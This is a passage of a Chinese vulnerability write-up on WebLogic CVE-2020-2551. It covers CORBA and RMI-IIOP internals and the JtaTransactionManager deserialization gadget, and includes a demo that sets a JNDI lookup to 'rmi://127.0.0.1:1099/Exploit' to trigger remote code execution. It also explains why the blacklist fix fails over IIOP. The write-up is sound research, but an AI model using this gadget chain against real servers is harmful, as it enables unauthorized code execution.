### CORBA网络流量分析
#### servant side
服务端流量大致分为两个部分：
  * 获取Naming Service
  * 注册servant side
获取Naming Service的流量如下：  
在返回的响应中，拿到了`RootPOA`：  
对应的代码为：  
接着检测获取到的`NamingService`对象是否为`NamingContextExt`类的示例：  
对应代码：  
最后发送`op=to_name`和`op=rebind`两个指令：  
分别为设置引用名，和设置绑定信息，来看一下`op=rebind`的数据包：  
这里通过IOR信息表示了servant side的相关rpc信息。
#### client side
这里以NameServer方式生成stub为例：
  * 获取nameservice、`op=_is_a`判断
  * 根据引用名获取servant side的接口Stub
  * 发送方法名，调用远程方法，得到结果  
分别对应代码步骤：  
## RMI-IIOP
RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。RMI-IIOP综合了RMI和CORBA的优点，克服了他们的缺点，使得程序员能更方便的编写分布式程序设计，实现分布式计算。  
### Demo: RMI-IIOP远程调用
参考文档[Tutorial: Getting Started Using RMI-IIOP](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html#7738)所述，一共四个步骤，对应的文件如下：
  * 定义远程接口类：HelloInterface.java
  * 编写实现类：HelloImpl.java, 实现接口HelloInterface
  * 编写服务端类：HelloServer.java, RMI服务端实例远程类，将其绑定到name service中
  * 编写客户端类：HelloClient.java, 调用远程方法`sayHello()`
实现接口类，必须要实现Remote远程类，且抛出`java.rmi.RemoteException`异常。  
HelloInterface.java
    import java.rmi.Remote;
    public interface HelloInterface extends java.rmi.Remote {
        public void sayHello( String from ) throws java.rmi.RemoteException;
    }
实现接口类，必须写构造方法调用父类构造方法，给远程对象初始化使用，同时要实现一个方法给远程调用使用(`sayHello()`)  
HelloImpl.java
    import javax.rmi.PortableRemoteObject;
    public class HelloImpl extends PortableRemoteObject implements HelloInterface {
        public HelloImpl() throws java.rmi.RemoteException {
            super();     // invoke rmi linking and remote object initialization
        }
        public void sayHello( String from ) throws java.rmi.RemoteException {
            System.out.println( "Hello from " + from + "!!" );
            System.out.flush();
        }
    }
编写服务端，创建servant实例，绑定对象。  
HelloServer.java
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.util.Hashtable;
    public class HelloServer {
        public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory";
        public static void main(String[] args) {
            try {
                //实例化Hello servant
                HelloImpl helloRef = new HelloImpl();
                //使用JNDI在命名服务中发布引用
                InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050");
                initialContext.rebind("HelloService", helloRef);
                System.out.println("Hello Server Ready...");
                Thread.currentThread().join();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
编写客户端类，远程调用`sayHello()`方法。  
HelloClient.java
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.rmi.PortableRemoteObject;
    import java.util.Hashtable;
    public class HelloClient {
        public static void  main( String args[] ) {
            Context ic;
            Object objref;
            HelloInterface hi;
            try {
                Hashtable env = new Hashtable();
                env.put("java.naming.factory.initial", "com.sun.jndi.cosnaming.CNCtxFactory");
                env.put("java.naming.provider.url", "iiop://127.0.0.1:1050");
                ic = new InitialContext(env);
                // STEP 1: Get the Object reference from the Name Service
                // using JNDI call.
                objref = ic.lookup("HelloService");
                System.out.println("Client: Obtained a ref. to Hello server.");
                // STEP 2: Narrow the object reference to the concrete type and
                // invoke the method.
                hi = (HelloInterface) PortableRemoteObject.narrow(
                        objref, HelloInterface.class);
                hi.sayHello( " MARS " );
            } catch( Exception e ) {
                System.err.println( "Exception " + e + "Caught" );
                e.printStackTrace( );
            }
        }
    }
**编译**  
编译远程接口实现类:
    javac -d . -classpath . HelloImpl.java
给实现类创建stub和skeleton(简单理解即jvm中的套接字通信程序)：
    rmic -iiop HelloImpl
执行完后会创建两个文件：
  * _HelloInterface_Stub.class： 客户端的stub
  * _HelloImpl_Tie.class：服务端的skeleton  
编译：
    javac -d . -classpath . HelloInterface.java HelloServer.java HelloClient.java
**运行**  
开启Naming Service：
    orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1
运行客户端服务端：
    java -classpath .  HelloServer
    java -classpath .  HelloClient
> 上述客户端服务端代码如果在`InitialContext`没传入参数可以像文档中所述通过`java -D`传递  
>  
**结果**  
# 漏洞复现
weblogic10.3.6版本，jdk8u73版本
> 采坑，记得weblogic版本、rmi服务、exp版本都一致
EXP：  
# 漏洞分析
这个该漏洞借助IIOP协议触发反序列化，结合对`JtaTransactionManager`类的错误过滤，导致可以结合其触发其类的JNDI注入造成RCE的效果。
## JtaTransactionManager Gadget分析
weblogic中自带的一个Spring框架的包：`/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject`  
在反序列化调用`readObject`时，会调用`initUserTransactionAndTransactionManager`方法：  
接着调用`this.lookupUserTransaction`方法，传入成员变量`this.userTransactionName`:  
获取`this.getJndiTemplate()`后，在`/com/bea/core/repackaged/springframework/jndi/JndiTemplate#lookup`中  
到这里通过控制`userTransactionName`属性，进行JNDI注入：  
demo:
    public class jnditest {
        public static void main(String[] args){
            JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
            jtaTransactionManager.setUserTransactionName("rmi://127.0.0.1:1099/Exploit");
            serialize(jtaTransactionManager);
            deserialize();
        }
        public static void serialize(Object obj) {
            try {
                ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("jndi.ser"));
                os.writeObject(obj);
                os.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void deserialize() {
            try {
                ObjectInputStream is = new ObjectInputStream(new FileInputStream("jndi.ser"));
                is.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
后来翻了一下资料，在[CVE-2018-3191](https://paper.seebug.org/718/)中使用的就是该gadget，当时结合T3协议进行反序列化，修复方案将`JtaTransactionManager`的父类`AbstractPlatformTransactionManager`加入到黑名单列表了，T3协议使用的是`resolveClass`方法去过滤的,`resolveClass`方法是会读取父类的,所以T3协议这样过滤是没问题的。但是在IIOP协议这里，也是使用黑名单进行过滤，但不是使用`resolveClass`方法去判断的，这样默认只会判断本类的类名，而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了，从而触发JNDI注入。
## Context的生成以及bind的流程(servant side)
在上文中RMI-IIOP的客户端demo中，分为三个步骤：
  * 从Name Service中获取Conetext对象
  * 从Name Service中查询指定名称所对应的引用
  * 调用远程方法  
先来看第一个过程，无论是客户端还是服务端都要进行的的一个步骤：`InitialContext`方法中将`env`参数传入，进行初始化：  
经过几次调用，一直跟进到`javax/naming/spi/NamingManager.java#getInitialContext`方法  
可以看到在这里将我们传入的`env`对应的工厂类进行获取，我们来找一下，在weblogic中有多少个可以加载的工厂类，找到`InitialContextFactory`接口(`ctrl+h`查看依赖树)  
这里直接来看`WLInitialContextFactory`类：  
`/wlserver_10.3/server/lib/wls-api.jar!/weblogic/jndi/Environment#getContext`  
`getInitialContext`方法中，到这里其实就是CORBA的解析流程了，  
简单跟一下`string_to_object`方法，这里其实就是上文中CORBA的stub生成三种方式所对应的协议：
  * IOR
  * Corbaname
  * Corbaloc  
再来看`getORBReference`方法，其实就是CORBA初始化orb获取`Name Service`的过程：  
对应CORBA中代码：  
再来看一下`Conetext`的绑定过程：`/corba/j2ee/naming/ContextImpl`  
可以看到这个过程其实就是CORBA生成IOR的过程，指定java类型交互的约定为`tk_value`，设定op为`rebind_any`，存储序列化数据到any类，待client
side调用。
> 其实在分析这里之前一直有一个问题无法理解，一直以为weblogic是orbd+servant side，而我们写的exp是client
> side，在和@Lucifaer师傅学习后，其实对于weblogic的orbd而言，servant side和client
> side都是客户端，而weblogic(orbd)是在处理servant side的时候解析数据造成反序列化的问题。
到这里servant side的注册就结束了，下面来分析一下weblogic是如何对其进行解析的。
## weblogic解析流程
weblogic解析请求的入口开始：weblogic/rmi/internal/wls/WLSExecuteRequest#run  
完整调用栈在下文，这里选取几个比较关键的点来分析：`weblogic/corba/idl/CorbaServerRef#invoke`  
先是判断请求类型是否为`objectMethods`已经存在的，这里是`rebind_any`，不存在则调用`this.delegate._invoke`方法，然后将方法类型，`IIOPInputStream`数据传入`_invoke`函数：  
`rebind_any`指令类型对应的`var5`为1，进入`var2.read_any()`  
这里的`this.read_TypeCode()`即上文中Context
bind中的`tk_value`设置的交互类型，在`weblogic/corba/idl/AnyImpl#read_value_internal`对应`case
30`，同时这里的`Any`类型，在上文`Context`分析中正式我们将序列化数据插入的地方。  
跟进`weblogic/corba/utils/ValueHandlerImpl`  
在这里var2为`ObjectStreamClass`，调用其readObject方法。继续跟`readObject`：  
反射调用`JtaTransactionManager`的`readObject`：`com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject`  
最后就是jndi注入了：  
完整调用栈：  
# EXP分析
在分析EXP时个人有一点疑惑，记录一下分析和解决的过程。
参考[Y4er/CVE-2020-2551](https://github.com/Y4er/CVE-2020-2551)，这里我们结合IIOP
servant side的demo来看：  
上图为EXP，下图为IIOP服务端，这里有一点需要注意的是，在demo中`HelloImpl`类继承了`HelloInterface`实现了`java.rmi.Remote`远程类的继承：  
回过头来看`JtaTransactionManager`类的接口：  
正是这个原因才需要我们在编写EXP的时候，需要将`jtaTransactionManager`通过反射，动态转换成remote达到远程调用的目的。
# 最后
在自己动手分析之前，我一直把weblogic当成servant side和orbd(name
Service)，也无法理解为什么EXP要和COBAR的servant
side一样用rebind注册，后来在@Lucifaer师傅的帮助下才理解这里没有client side的参与，而对于Name
Service而言这两者都是客户端。
其次这种漏洞IIOP只是载体，`JtaTransactionManager`为gadget，官方修复也仅仅只是添加黑名单，IIOP的问题没根本解决，再爆一个gadget又得修，问题源源不断。更坑爹的是官网直接下的weblogic连黑名单都没有，个人觉得防御这种问题单纯靠waf流量检测根本防不住，没有反序列化特征，二进制数据流。要防范这类新问题的产生，或许只有RASP的行为检测才能解决。
参考文章：
  * [关于 Java 中的 RMI-IIOP](https://paper.seebug.org/1105/)
  * [Tutorial: Getting Started Using RMI-IIOP](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html#7738)
  * [An Introduction To The CORBA And Java RMI-IIOP](https://weinan.io/2017/05/03/corba-iiop.html)
  * [Java IDL: IDL to Java Language Mapping](https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html)